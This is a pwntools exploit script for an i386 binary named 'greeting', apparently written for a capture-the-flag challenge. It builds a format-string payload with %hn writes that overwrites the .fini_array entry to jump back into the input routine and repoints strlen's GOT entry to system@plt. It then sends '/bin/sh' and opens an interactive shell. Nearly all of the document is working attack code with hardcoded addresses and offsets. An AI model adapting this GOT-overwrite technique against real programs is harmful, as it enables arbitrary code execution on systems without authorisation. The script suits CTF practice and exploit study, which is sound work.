from pwn import *
import argparse, time

parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

context.arch='i386'

def callGDB():
    gdb.attach(io,'''
    
        b *0x0804864f
        b *0x080486c2
        c
    
    ''')
    #time.sleep(1)

io = process('./greeting')
#callGDB()

# AAAAAA-0x80487d0-0xff82744c-(nil)-(nil)-(nil)-(nil)-0x6563694e-0x206f7420-0x7465656d-0x756f7920-0x4141202c-0x41414141-0x2d70252d

io.recvuntil(b"Please tell me your name... ")
#io.sendline(b"AAAAAA-%12$p")   # testing which param has the start of our input

fini_array = 0x08049934 # section address
system_plt = 0x08048490      # system@GLIBC_2.0
strlen_got = 0x8049a54      # strlen@GLIBC_2.0  
getnline = 0x08048614


payload = b"AA"
payload += p32(fini_array)      #12th param
payload += p32(fini_array+2)    # 13th param
payload += p32(strlen_got)          # 14th param
payload += p32(strlen_got+2)        # 15th param
payload += b"%"+str(0x804 - (18+18)).encode()+ b"x" + b"%13$hn%15$hn"           # example: %12312x
#---payload += b"%"+str(0x804 - 16).encode()+ b"x" + b"%15$hn"
payload += b"%"+str(0x8614 -0x804).encode() + b"x" + b"%12$hn" # getnline
payload += b"%"+str(0xfe7c).encode() + b"x" + b"%14$hn"  # system plt 0x18490-0x8614 = 0xfe7c

# 18 bytes - Nice to meet you,(space)
# 18 bytes - AA + fini_array address + strlen address
#payload += b"%"+str(0x804 - (18+18)).encode()+ b"x" + b"%13$hn"
#payload += b"%"+str(0x8614-0x804).encode() + b"x" + b"%12$hn"

log.info("Payload size: "+str(len(payload)))



io.sendline(payload)
#io.recvuntil(b":)\n")
#io.recvline()
io.sendline(b'/bin/sh')

io.interactive()


